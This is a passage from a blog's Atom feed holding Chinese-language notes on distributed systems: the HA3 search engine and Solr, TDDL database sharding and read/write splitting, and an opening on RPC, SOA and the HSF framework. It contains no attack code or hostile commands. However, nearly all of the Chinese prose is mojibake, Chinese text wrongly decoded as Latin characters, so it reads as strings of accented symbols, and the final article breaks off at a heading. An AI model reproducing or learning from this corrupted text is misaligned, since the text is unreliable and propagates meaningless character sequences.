<p>å¦‚æœå¼€å‘è€…é…ç½®äº†æŸ¥è¯¢æ”¹å†™å¤„ç†é€»è¾‘ï¼ˆå³å°†ä¸Šçº¿ï¼‰ï¼ŒAggregatorä¼šå°†æŸ¥è¯¢è¯·æ±‚å‘é€ç»™æŸ¥è¯¢æ”¹å†™æœåŠ¡QPï¼ŒQPæŒ‰ç…§å¼€å‘è€…é…ç½®çš„å¤„ç†è§„åˆ™ï¼ˆä¾‹å¦‚ï¼šæ‹¼å†™çº é”™ã€åŒä¹‰è¯æˆ–è€…æŸ¥è¯¢è¯­ä¹‰æ”¹å†™ï¼‰æ”¹å†™æŸ¥è¯¢è¯·æ±‚ï¼Œå¹¶å°†æ”¹å†™åçš„æŸ¥è¯¢å›ä¼ ç»™Aggregatorï¼ŒAggregatoræœ€ç»ˆå°†æŸ¥è¯¢è¯·æ±‚å‘é€ç»™æœç´¢ç³»ç»ŸHA3ï¼ŒHA3æ ¹æ®å¼€å‘è€…å®šåˆ¶çš„ç›¸å…³æ€§æ’åºè§„åˆ™å¯¹å‘½ä¸­çš„ç»“æœæ–‡æ¡£æ’åºï¼Œå¹¶æœ€ç»ˆé€šè¿‡Aggregatorå°†ç»“æœè¿”å›ç»™å¼€å‘è€…ã€‚</p>
<p>ä¸ºäº†ä¿è¯ä¸åŒå¼€å‘è€…å„ä¸ªåº”ç”¨æ•°æ®æ¨é€å’Œæœç´¢ç›¸äº’ä¸å—å½±å“ï¼Œèµ„æºåˆç†åˆ©ç”¨ã€‚é…é¢ç®¡ç†æœåŠ¡ï¼ˆQuota Serverï¼‰ä¼šå¯¹è¿›å…¥ç³»ç»Ÿçš„æ•°æ®å’Œæœç´¢è¯·æ±‚é¢‘ç‡ä¾æ®å¼€å‘è€…çš„é…é¢ï¼ˆæ–‡æ¡£æ€»é‡ã€QPSï¼‰åšé™æµæ§åˆ¶ã€‚è¶…å‡ºé…é¢éƒ¨åˆ†çš„æ•°æ®æ¨é€å°†å¤±è´¥ï¼ŒæŸ¥è¯¢è¯·æ±‚å°†éšæœºä¸¢å¼ƒã€‚</p>
<h3 id="å¼•æ“ha3" tabindex="-1"> å¼•æ“HA3</h3>
<p>HA3æ˜¯é˜¿é‡Œè‡ªä¸»ç ”å‘çš„æ–°ä¸€ä»£åˆ†å¸ƒå¼å®æ—¶æœç´¢ç³»ç»Ÿï¼Œä¸­æ–‡åå«é—®å¤©3ï¼Œå…·å¤‡è‡ªåŠ¨å®¹ç¾ã€åŠ¨æ€æ‰©å®¹ã€ç§’çº§å®æ—¶ç­‰èƒ½åŠ›ã€‚ä¸‹å›¾æ˜¯HA3ç³»ç»Ÿæ¨¡å—ç»„æˆå›¾ã€‚</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-14-00-30.png" alt="" loading="lazy"></p>
<p>å…¶ä¸­ï¼ŒAdminæ˜¯æ•´ä¸ªç³»ç»Ÿçš„å¤§è„‘ï¼Œè´Ÿè´£èŠ‚ç‚¹è§’è‰²åˆ†é…ã€è°ƒåº¦å†³ç­–ã€FailOverå¤„ç†ã€çŠ¶æ€ç›‘æµ‹ã€åŠ¨æ€æ‰©å®¹ç­‰ã€‚Amonitoræ˜¯ç³»ç»Ÿçš„æ€§èƒ½çŠ¶æ€ç›‘æ§æ¨¡å—ï¼Œæ”¶é›†å’Œå±•ç¤ºæ•´ä¸ªç³»ç»Ÿæ‰€æœ‰èŠ‚ç‚¹çš„æ€§èƒ½å‚æ•°ã€‚QRSæ˜¯æŸ¥è¯¢è§£æå’Œæ”¹å†™æœåŠ¡ï¼Œæ˜¯ç³»ç»Ÿå¯¹å¤–çš„æœç´¢æ¥å£ã€‚Proxyæ˜¯æœç´¢ä»£ç†æ¨¡å—ï¼Œè´Ÿè´£æ¥æ”¶QRSçš„æŸ¥è¯¢è¯·æ±‚ï¼Œå¹¶è½¬å‘ç»™ä¸‹è¾–çš„æ‰€æœ‰SearcherèŠ‚ç‚¹ã€‚SearcherèŠ‚ç‚¹æ‰§è¡Œå®é™…çš„æŸ¥è¯¢åŒ¹é…è®¡ç®—ï¼Œå°†æœç´¢ç»“æœæ±‡æ€»åå›ä¼ ç»™QRSã€‚</p>
<h1 id="solr" tabindex="-1"> Solr</h1>
<p>Solræ˜¯ä¸€ä¸ªåŸºäºLuceneçš„Javaæœç´¢å¼•æ“æœåŠ¡å™¨ã€‚Solr æä¾›äº†å±‚é¢æœç´¢ã€å‘½ä¸­é†’ç›®æ˜¾ç¤ºå¹¶ä¸”æ”¯æŒå¤šç§è¾“å‡ºæ ¼å¼ï¼ˆåŒ…æ‹¬ XML/XSLT å’Œ JSON æ ¼å¼ï¼‰ã€‚å®ƒæ˜“äºå®‰è£…å’Œé…ç½®ï¼Œè€Œä¸”é™„å¸¦äº†ä¸€ä¸ªåŸºäº HTTP çš„ç®¡ç†ç•Œé¢ã€‚Solrå·²ç»åœ¨ä¼—å¤šå¤§å‹çš„ç½‘ç«™ä¸­ä½¿ç”¨ï¼Œè¾ƒä¸ºæˆç†Ÿå’Œç¨³å®šã€‚Solr åŒ…è£…å¹¶æ‰©å±•äº† Luceneï¼Œæ‰€ä»¥Solrçš„åŸºæœ¬ä¸Šæ²¿ç”¨äº†Luceneçš„ç›¸å…³æœ¯è¯­ã€‚æ›´é‡è¦çš„æ˜¯ï¼ŒSolr åˆ›å»ºçš„ç´¢å¼•ä¸ Lucene æœç´¢å¼•æ“åº“å®Œå…¨å…¼å®¹ã€‚é€šè¿‡å¯¹ Solr è¿›è¡Œé€‚å½“çš„é…ç½®ï¼ŒæŸäº›æƒ…å†µä¸‹å¯èƒ½éœ€è¦è¿›è¡Œç¼–ç ï¼ŒSolr å¯ä»¥é˜…è¯»å’Œä½¿ç”¨æ„å»ºåˆ°å…¶ä»– Lucene åº”ç”¨ç¨‹åºä¸­çš„ç´¢å¼•ã€‚æ­¤å¤–ï¼Œå¾ˆå¤š Lucene å·¥å…·ï¼ˆå¦‚Nutchã€ Lukeï¼‰ä¹Ÿå¯ä»¥ä½¿ç”¨ Solr åˆ›å»ºçš„ç´¢å¼•ã€‚</p>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">TDDL</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[

<h1 id="tddl" tabindex="-1"> TDDL</h1>
<h2 id="äº§ç”ŸèƒŒæ™¯" tabindex="-1"> äº§ç”ŸèƒŒæ™¯</h2>
<p>ä¸€å¼€å§‹çš„æ—¶å€™ï¼Œç”±äºæ•°æ®é‡æ¯”è¾ƒå°‘ï¼Œæ•°æ®åº“æœ€é•¿è§çš„æ˜¯å•åº“å•è¡¨çš„æƒ…å†µã€‚éšç€ä¸šåŠ¡çš„å‘å±•ï¼Œä¸šåŠ¡åº“ä¸­çš„æ•°æ®é‡ä¸æ–­å¢é•¿ã€‚å•åº“çš„æ€§èƒ½å·²ç»ä¸èƒ½å†æ”¯æŒä¸šåŠ¡çš„å‘å±•ã€‚æˆ‘ä»¬å¼€å§‹ä½¿ç”¨å¯¹æ•°æ®åº“è¿›è¡Œåˆ†åº“åˆ†è¡¨å’Œè¯»å†™åˆ†ç¦»çš„æ–¹å¼ï¼Œæ¥åˆ†æ•£æ•°æ®åº“çš„å‹åŠ›ï¼Œæé«˜æ•´ä½“çš„æ€§èƒ½ã€‚</p>
<ul>
<li>å•åº“å•è¡¨
é€šå¸¸åˆšå¼€å§‹çš„æ—¶å€™ï¼Œåº”ç”¨çš„æ•°æ®æ¯”è¾ƒå°‘ï¼Œä¹Ÿä¸ä¼šå¾ˆå¤æ‚ï¼Œæ‰€ä»¥åº”ç”¨åªæœ‰ä¸€ä¸ªæ•°æ®åº“ï¼Œæ•°æ®åº“ä¸­çš„è¡¨æ˜¯ä¸€å¼ å®Œæ•´çš„è¡¨ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬åˆšå¼€å§‹æ¥è§¦æ•°æ®åº“æ—¶çš„æ•°æ®åº“å½¢æ€ã€‚</li>
<li>è¯»å†™åˆ†ç¦»éšç€ä¸šåŠ¡çš„å‘å±•ï¼Œæ•°æ®é‡ä¸æ•°æ®è®¿é—®é‡ä¸æ–­å¢é•¿ï¼Œå¾ˆå¤šæ—¶å€™åº”ç”¨çš„ä¸»è¦ä¸šåŠ¡æ˜¯è¯»å¤šå†™å°‘çš„ï¼Œæ¯”å¦‚è¯´ä¸€äº›æ–°é—»ç½‘ç«™ï¼Œè¿è¥åœ¨åå°ä¸Šä¼ äº†ä¸€å †æ–°é—»ä¹‹åï¼Œæ‰€æœ‰çš„ç”¨æˆ·éƒ½ä¼šå»è¯»å–è¿™äº›æ–°é—»èµ„è®¯ï¼Œå› æ­¤æ•°æ®åº“é¢ä¸´çš„è¯»å‹åŠ›è¿œå¤§äºå†™å‹åŠ›ï¼Œé‚£ä¹ˆè¿™æ—¶å€™åœ¨åŸæ¥æ•°æ®åº“ Master çš„åŸºç¡€ä¸Šå¢åŠ ä¸€ä¸ªå¤‡ç”¨æ•°æ®åº“ Slaveï¼Œå¤‡åº“å’Œä¸»åº“å­˜å‚¨ç€ç›¸åŒçš„æ•°æ®ï¼Œä½†åªæä¾›è¯»æœåŠ¡ï¼Œä¸æä¾›å†™æœåŠ¡ã€‚ä»¥åçš„å†™æ“ä½œä»¥åŠäº‹åŠ¡ä¸­çš„è¯»æ“ä½œå°±èµ°ä¸»åº“ï¼Œå…¶å®ƒè¯»æ“ä½œå°±èµ°å¤‡åº“ï¼Œè¿™å°±æ˜¯æ‰€è°“çš„è¯»å†™åˆ†ç¦»ã€‚è¯»å†™åˆ†ç¦»ä¼šç›´æ¥å¸¦æ¥ä¸¤ä¸ªé—®é¢˜ï¼š
<ul>
<li><strong>æ•°æ®å¤åˆ¶é—®é¢˜</strong>ï¼šå› ä¸ºæœ€æ–°å†™å…¥çš„æ•°æ®åªä¼šå­˜å‚¨åœ¨ä¸»åº“ä¸­ï¼Œä¹‹åæƒ³è¦åœ¨å¤‡åº“ä¸­è¯»å–åˆ°æ–°æ•°æ®å°±å¿…é¡»è¦ä»ä¸»åº“å¤åˆ¶è¿‡æ¥ï¼Œè¿™ä¼šå¸¦æ¥ä¸€å®šçš„å»¶è¿Ÿï¼Œé€ æˆçŸ­æœŸçš„æ•°æ®ä¸ä¸€è‡´æ€§ã€‚ä½†è¿™ä¸ªé—®é¢˜åº”è¯¥ä¹Ÿæ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«å¥½çš„åŠæ³•ï¼Œä¸»è¦ä¾èµ–äºæ•°æ®åº“æä¾›çš„æ•°æ®å¤åˆ¶æœºåˆ¶ï¼Œå¸¸ç”¨çš„æ˜¯æ ¹æ®æ•°æ®åº“æ—¥å¿— binary-log å®ç°æ•°æ®å¤åˆ¶ã€‚</li>
<li><strong>æ•°æ®æºé€‰æ‹©é—®é¢˜</strong>ï¼šè¯»å†™åˆ†ç¦»ä¹‹åæˆ‘ä»¬éƒ½çŸ¥é“å†™è¦æ‰¾ä¸»åº“ï¼Œè¯»è¦æ‰¾å¤‡åº“ï¼Œä½†æ˜¯ç¨‹åºä¸çŸ¥é“ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ç¨‹åºä¸­åº”è¯¥æ ¹æ® SQL æ¥åˆ¤æ–­å‡ºæ˜¯è¯»æ“ä½œè¿˜æ˜¯å†™æ“ä½œï¼Œè¿›è€Œæ­£ç¡®é€‰æ‹©è¦è®¿é—®çš„æ•°æ®åº“ã€‚</li>
</ul>
</li>
<li>å‚ç›´åˆ†åº“æ•°æ®é‡ä¸è®¿é—®é‡ç»§ç»­ä¸Šå‡æ—¶ï¼Œä¸»å¤‡åº“çš„å‹åŠ›éƒ½åœ¨å˜å¤§ï¼Œè¿™æ—¶å€™å¯ä»¥æ ¹æ®ä¸šåŠ¡ç‰¹ç‚¹è€ƒè™‘å°†æ•°æ®åº“å‚ç›´æ‹†åˆ†ï¼Œå³æŠŠæ•°æ®åº“ä¸­ä¸åŒçš„ä¸šåŠ¡å•å…ƒçš„æ•°æ®åˆ’åˆ†åˆ°ä¸åŒçš„æ•°æ®åº“é‡Œé¢ã€‚æ¯”å¦‚è¯´ï¼Œè¿˜æ˜¯æ–°é—»ç½‘ç«™ï¼Œæ³¨å†Œç”¨æˆ·çš„ä¿¡æ¯ä¸æ–°é—»æ˜¯æ²¡æœ‰å¤šå¤§å…³ç³»çš„ï¼Œæ•°æ®åº“è®¿é—®å‹åŠ›å¤§æ—¶å¯ä»¥å°è¯•æŠŠç”¨æˆ·ä¿¡æ¯ç›¸å…³çš„è¡¨æ”¾åœ¨ä¸€ä¸ªæ•°æ®åº“ï¼Œæ–°é—»ç›¸å…³çš„è¡¨æ”¾åœ¨ä¸€ä¸ªæ•°æ®åº“ä¸­ï¼Œè¿™æ ·å¤§å¤§å‡å°äº†æ•°æ®åº“çš„è®¿é—®å‹åŠ›ã€‚å‚ç›´åˆ†åº“ä¼šå¸¦æ¥ä»¥ä¸‹é—®é¢˜ï¼š
<ul>
<li>ACID è¢«æ‰“ç ´ï¼šæ•°æ®åˆ†åˆ°ä¸åŒçš„æ•°æ®åº“ä¹‹åï¼ŒåŸæ¥çš„äº‹åŠ¡æ“ä½œå°†ä¼šå—å¾ˆå¤§å½±å“ï¼Œæ¯”å¦‚è¯´æ³¨å†Œè´¦æˆ·çš„æ—¶å€™éœ€è¦åœ¨ç”¨æˆ·è¡¨å’Œç”¨æˆ·ä¿¡æ¯è¡¨ä¸­æ’å…¥ä¸€æ¡æ•°æ®ï¼Œå•æœºæ•°æ®åº“åˆ©ç”¨äº‹åŠ¡å¯ä»¥å¾ˆå¥½åœ°å®Œæˆè¿™ä¸ªä»»åŠ¡ï¼Œä½†æ˜¯å¤šæœºå°†ä¼šå˜å¾—æ¯”è¾ƒéº»çƒ¦ã€‚ä»¥ä¸‹ä¸¤ç‚¹ä¹Ÿæ˜¯å› ä¸ºæ•°æ®åº“åœ¨ä¸åŒçš„æœºå­ä¸Šè€Œå¯¼è‡´ç®€å•çš„æ“ä½œå˜å¾—å¤æ‚ï¼Œä¸ä¸€ä¸€åˆ†æäº†ã€‚</li>
<li>Join æ“ä½œå›°éš¾</li>
<li>å¤–é”®çº¦æŸå—å½±å“</li>
</ul>
</li>
<li>æ°´å¹³åˆ†è¡¨ç»è¿‡é•¿æ—¶é—´ç§¯ç´¯ï¼Œç‰¹åˆ«å¯¹äº ugc çš„ä¸šåŠ¡ï¼Œæ•°æ®é‡ä¼šè¾¾åˆ°æƒŠäººçš„åœ°æ­¥ï¼Œæ¯å¼ è¡¨å­˜æ”¾ç€å¤§é‡çš„æ•°æ®ï¼Œä»»ä½• CRUD éƒ½å˜æˆäº†ä¸€æ¬¡æå…¶æ¶ˆè€—æ€§èƒ½çš„æ“ä½œï¼Œè¿™ä¸ªæ—¶å€™å°±ä¼šè€ƒè™‘æ°´å¹³åˆ†è¡¨ï¼ŒæŠŠä¸€å¼ è¡¨å†…å¤§é‡çš„æ•°æ®æ‹†åˆ†æˆå¤šå¼ å­è¡¨ï¼Œæ¯”å¦‚è¯´åŸæ¥ä¸€å¼ è¡¨ä¸­å­˜æ”¾ 50000 æ¡æ•°æ®ï¼Œæ°´å¹³åˆ†æˆ 5 å¼ è¡¨ä¹‹åï¼Œæ¯å¼ è¡¨åªè¦å­˜æ”¾ 10000 æ¡æ•°æ®ã€‚è¿™ç§ç»“æ„å¯ä»¥æ¯”è¾ƒå®¹æ˜“çš„å­˜å‚¨å’Œç»´æŠ¤æµ·é‡æ•°æ®ã€‚æ°´å¹³åˆ†è¡¨ä¼šåœ¨å‚ç›´åˆ†åº“çš„åŸºç¡€ä¸Šå¸¦æ¥æ›´å¤šçš„å½±å“ï¼š
<ul>
<li>è‡ªå¢ä¸»é”®ä¼šæœ‰å½±å“ï¼šè¿™ä¸ªå½±å“å¾ˆæ˜æ˜¾ï¼Œåˆ†è¡¨ä¸­å¦‚æœä½¿ç”¨çš„æ˜¯è‡ªå¢ä¸»é”®çš„è¯ï¼Œé‚£ä¹ˆå°±ä¸èƒ½äº§ç”Ÿå”¯ä¸€çš„ ID äº†ï¼Œå› ä¸ºé€»è¾‘ä¸Šæ¥è¯´å¤šä¸ªåˆ†è¡¨å…¶å®éƒ½å±äºä¸€å¼ è¡¨ï¼Œè‡ªå¢ä¸»é”®æ— æ³•æ ‡è¯†æ¯ä¸€æ¡æ•°æ®ã€‚</li>
<li>æœ‰äº›å•è¡¨æŸ¥è¯¢ä¼šå˜æˆå¤šè¡¨ï¼šæ¯”å¦‚è¯´ count æ“ä½œï¼ŒåŸæ¥æ˜¯ä¸€å¼ è¡¨çš„é—®é¢˜ï¼Œç°åœ¨è¦ä»å¤šå¼ åˆ†è¡¨ä¸­å…±åŒæŸ¥è¯¢æ‰èƒ½å¾—åˆ°ç»“æœã€‚</li>
</ul>
</li>
</ul>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-13-28-49.png" alt="" loading="lazy"></p>
<h2 id="åº”ç”¨åœºæ™¯" tabindex="-1"> åº”ç”¨åœºæ™¯</h2>
<ul>
<li>è¯»å†™åˆ†ç¦»</li>
<li>åˆ†åº“åˆ†è¡¨</li>
<li>åŠ¨æ€æ•°æ®æº</li>
<li>ä¸»å¤‡åˆ‡æ¢</li>
</ul>
<p>TDDL ä¸»è¦è§£å†³äº†ä»¥ä¸‹é—®é¢˜ï¼š</p>
<ol>
<li>å•æœºæ•°æ®åº“å®¹é‡ç“¶é¢ˆï¼š éšç€æ•°æ®é‡å’Œè®¿é—®é‡çš„å¢é•¿ï¼Œå•æœºæ•°æ®åº“ä¼šé‡åˆ°å¾ˆå¤§çš„æŒ‘æˆ˜ï¼Œä¾èµ–ç¡¬ä»¶å‡çº§å¹¶ä¸èƒ½å®Œå…¨è§£å†³é—®é¢˜ã€‚</li>
<li>å•æœºæ•°æ®åº“æ‰©å±•å›°éš¾ï¼šä¼ ç»Ÿæ•°æ®åº“å®¹é‡æ‰©å±•å¾€å¾€æ„å‘³ç€æœåŠ¡ä¸­æ–­ï¼Œå¾ˆéš¾åšåˆ°ä¸šåŠ¡æ— æ„ŸçŸ¥æˆ–è€…å°‘æ„ŸçŸ¥ã€‚</li>
<li>ä¼ ç»Ÿæ•°æ®åº“ä½¿ç”¨æˆæœ¬é«˜ã€‚</li>
<li>è·¨è¯­è¨€æ”¯æŒï¼šåŸºäº TDDL çš„ Corona äº§å“æä¾›è·¨è¯­è¨€æ”¯æŒã€‚Corona æ˜¯ä¸€ä¸ª MySQL çš„ proxyï¼Œæä¾›æ ‡å‡†çš„ MySQL åè®®ã€‚å› æ­¤ï¼Œç”¨æˆ·å¯ä»¥åƒä½¿ç”¨ MySQL ä¸€æ ·ä½¿ç”¨ Coronaï¼Œä»è€Œæä¾›è·¨è¯­è¨€æ”¯æŒã€‚</li>
</ol>
<h2 id="æ•´ä½“æ¶æ„" tabindex="-1"> æ•´ä½“æ¶æ„</h2>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-13-29-36.png" alt="" loading="lazy"></p>
<p>å®¢æˆ·ç«¯æ¶æ„
<img src="@source/assets/cs-note/distribute/mk-2020-07-12-13-30-03.png" alt="" loading="lazy"></p>
<p>æœåŠ¡ç«¯æ¶æ„
<img src="@source/assets/cs-note/distribute/mk-2020-07-12-13-30-14.png" alt="" loading="lazy"></p>
<h3 id="tddlä¸‰å±‚æ•°æ®æºå…³ç³»" tabindex="-1"> TDDLä¸‰å±‚æ•°æ®æºå…³ç³»</h3>
<p>Matrixï¼ˆTDataSourceï¼‰å®ç°åˆ†åº“åˆ†è¡¨é€»è¾‘ï¼ŒæŒæœ‰å¤šä¸ªGroupå®ä¾‹ï¼›</p>
<p>Groupï¼ˆTGroupDataSourceï¼‰å®ç°æ•°æ®åº“çš„ä¸»å¤‡åˆ‡æ¢ï¼Œè¯»å†™åˆ†ç¦»é€»è¾‘ï¼ŒæŒæœ‰å¤šä¸ªAtomå®ä¾‹ï¼›</p>
<p>Atomï¼ˆTAtomDataSourceï¼‰å®ç°æ•°æ®åº“ipï¼Œportï¼Œpasswordï¼ŒconnectionPropertiesç­‰ä¿¡æ¯çš„åŠ¨æ€æ¨é€ï¼ŒæŒæœ‰åŸå­çš„æ•°æ®æºï¼ˆåˆ†ç¦»çš„Jbossæ•°æ®æºï¼‰ã€‚</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-13-30-32.png" alt="" loading="lazy"></p>
<ul>
<li>Matrixå±‚ï¼šMatrixå±‚ä¸»è¦è´Ÿè´£çš„æ˜¯SQLçš„è§£æï¼Œä¼˜åŒ–ï¼Œæ‰§è¡Œã€‚è¿™ä¸€å±‚ä¸»è¦è§£å†³äº†åˆ†åº“åˆ†è¡¨å¯¹åº”ç”¨é€æ˜åŒ–çš„é—®é¢˜ã€‚åº”ç”¨åœ¨è¿™ä¸€å±‚çœ‹åˆ°çš„è¡¨æ˜¯ä½œä¸ºä¸€ä¸ªå•è¡¨æ¥çœ‹å¾…çš„ã€‚</li>
<li>Groupå±‚ï¼šè¯»å†™åˆ†ç¦»ä¸ä¸»å¤‡åˆ‡æ¢å¸¦æ¥çš„é—®é¢˜ç”± Group å±‚è§£å†³</li>
<li>Atomå±‚ï¼šAtomå±‚ä¸»è¦æ˜¯ç”±ç‰©ç†DBç»„æˆï¼Œè´Ÿè´£ç®¡ç†DBçš„é“¾æ¥çŠ¶æ€ï¼Œç»™ä¸Šå±‚æä¾›æœåŠ¡ã€‚DBä¸€èˆ¬éƒ½æ˜¯æœ‰ä¸»åº“å’Œå¤‡åº“ç»„æˆ</li>
</ul>
<h2 id="tddlé«˜çº§ç‰¹æ€§" tabindex="-1"> TDDLé«˜çº§ç‰¹æ€§</h2>
<h3 id="tddlåˆ†åº“åˆ†è¡¨" tabindex="-1"> TDDLåˆ†åº“åˆ†è¡¨</h3>
<h3 id="tddl-sequence" tabindex="-1"> TDDL Sequence</h3>
<ul>
<li>ä¸»é”®å”¯ä¸€æ€§</li>
<li>å…¨å±€ID</li>
<li>é«˜å¹¶å‘åœºæ™¯ä¸‹çš„å”¯ä¸€ID</li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">ä»‹ç»</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E6%9C%8D%E5%8A%A1.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6/%E5%88%86%E5%B8%83%E5%BC%8F%E6%9C%8D%E5%8A%A1.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>
</li>
</ul>

<h1 id="ä»‹ç»" tabindex="-1"> ä»‹ç»</h1>
<p>ä¸€èˆ¬æ„ä¹‰ä¸Šï¼Œä¸€ä¸ªå…¬å¸çš„ä¸šåŠ¡ç³»ç»Ÿå‘å±•è„‰ç»œåŸºæœ¬éƒ½æ˜¯ç±»ä¼¼ï¼Œä»å•ä½“åº”ç”¨åˆ°å¤šåº”ç”¨ï¼Œä»æœ¬åœ°è°ƒç”¨åˆ°è¿œç¨‹è°ƒç”¨ï¼Œéšç€å‘å±•éœ€è¦å¯¹è¿œç¨‹æœåŠ¡è¿›è¡Œé«˜æ•ˆçš„èµ„æºç®¡ç†ï¼Œè¿™ä¸ªè¿‡ç¨‹æ˜¯ç³»ç»Ÿåº”å¯¹å˜åŒ–å’Œå¤æ‚çš„åº”å¯¹ä¹‹é“ã€‚</p>
<h2 id="rpc" tabindex="-1"> RPC</h2>
<p>RPCï¼ˆRemote Process Callï¼‰ï¼Œå³è¿œç¨‹æœåŠ¡è°ƒç”¨ï¼Œè¢«å¹¿æ³›åœ°åº”ç”¨åœ¨å¾ˆå¤šä¼ä¸šåº”ç”¨ä¸­ï¼Œæ˜¯æ—©æœŸä¸»è¦çš„æœåŠ¡æ²»ç†æ–¹æ¡ˆï¼Œå…¶æµç¨‹è¾ƒä¸ºç®€å•ï¼Œå®¢æˆ·ç«¯consumeræºå¸¦å‚æ•°å‘é€RPCè¯·æ±‚åˆ°æœåŠ¡æä¾›æ–¹providerï¼Œprovideræ ¹æ®å‚æ•°è·¯ç”±åˆ°å…·ä½“å‡½æ•°ï¼Œæ–¹æ³•ï¼Œå¹¶å°†æ‰§è¡Œè·å¾—çš„ç»“æœè¿”å›ï¼Œè‡³æ­¤ä¸€æ¬¡RPCè°ƒç”¨å®Œæˆã€‚</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-11-11-16.png" alt="" loading="lazy"></p>
<p>éšç€ä¸šåŠ¡çš„å‘å±•ï¼Œå¤§æ•°æ®æ—¶ä»£çš„åˆ°æ¥ï¼ŒæœåŠ¡æä¾›æ–¹çš„å‹åŠ›ä¹Ÿæ—¥ç›Šå¢å¤§ï¼Œå•æœºåº”ç”¨çš„å¤„ç†èƒ½åŠ›æ— è®ºåœ¨è½¯ä»¶ï¼Œç¡¬ä»¶ä¸Šéƒ½å—åˆ°é™åˆ¶ï¼Œproviderä¹Ÿä¸å¯èƒ½ä¸€ç›´æ— é™æ‰©å®¹ï¼Œå³ä½¿æ‰©å®¹ï¼Œä¹Ÿå­˜åœ¨ç€å¾ˆå¤šé—®é¢˜ï¼Œå³æœåŠ¡çš„è·¯ç”±ï¼Œå’ŒConsumerçš„è´Ÿè½½å‡è¡¡é—®é¢˜ã€‚å› æ­¤ï¼Œåˆ†å¸ƒå¼æœåŠ¡æ¶æ„åº”è¿è€Œç”Ÿï¼ŒRPCå‘å±•åˆ°ä¸€å®šé˜¶æ®µæ€è€ƒçš„å˜é©ï¼Œæˆä¸ºäº†åˆ†å¸ƒå¼æœåŠ¡ï¼Œäº‘è®¡ç®—çš„è®¡ç®—æœºåŸºç¡€ã€‚</p>
<h2 id="soa" tabindex="-1"> SOA</h2>
<p>ç”±äºç®€å•çš„RPCè°ƒç”¨å·²ç»ä¸èƒ½éšç€æ—¶ä»£å‘å±•æ»¡è¶³éœ€æ±‚ï¼Œå› æ­¤å¤æ‚çš„ä¸šåŠ¡é€»è¾‘å¯¹äºåˆ†å¸ƒå¼åº”ç”¨æ¶æ„ä½“ç³»çš„éœ€æ±‚æ„ˆå‘å¼ºçƒˆï¼Œä¸šåŠ¡å¸Œæœ›è‡ªå·±çš„æœåŠ¡æ˜¯åˆ†å¸ƒå¼éƒ¨ç½²çš„ï¼Œè¯·æ±‚æ˜¯åˆ†æµçš„ï¼Œå¯¹æ•°æ®çš„æ“ä½œæ˜¯èƒ½è¯»å†™åˆ†ç¦»çš„ï¼ŒåŒæ—¶èƒ½å±è”½è®¸å¤šå¤æ‚éœ€è¦è‡ªå·±ç¼–å†™çš„åº•å±‚æœåŠ¡ï¼Œå€ŸåŠ©å·²æœ‰çš„å…¬å…±æœåŠ¡ï¼Œå»å¿«é€Ÿçš„æ„å»ºè‡ªå·±çš„åº”ç”¨ï¼Œé™ä½äººåŠ›å¼€å‘ç»´æŠ¤çš„æˆæœ¬å’Œæé«˜åº”ç”¨äº¤ä»˜çš„æ•ˆç‡ï¼ŒåŸºå› æ­¤ï¼ŒåŸºäºåˆ†å¸ƒå¼æœåŠ¡æ€æƒ³çš„SOAï¼ˆService-Oriented Architectureï¼‰æˆäº†æ–°çš„å—è¿½æ§çš„æ¶æ„ã€‚å¸¸è§çš„SOAæœåŠ¡è°ƒç”¨æµç¨‹å›¾å¦‚ä¸‹ï¼š</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-11-11-54.png" alt="" loading="lazy"></p>
<h1 id="æ¡†æ¶" tabindex="-1"> æ¡†æ¶</h1>
<h2 id="hsf" tabindex="-1"> HSF</h2>
<p>HSF (High-speed Service Framework)ï¼Œé«˜é€ŸæœåŠ¡æ¡†æ¶ï¼Œæ˜¯åœ¨é˜¿é‡Œå·´å·´å†…éƒ¨å¹¿æ³›ä½¿ç”¨çš„åˆ†å¸ƒå¼ RPC æœåŠ¡æ¡†æ¶ã€‚</p>
<h3 id="åŠŸèƒ½è§’è‰²" tabindex="-1"> åŠŸèƒ½è§’è‰²</h3>
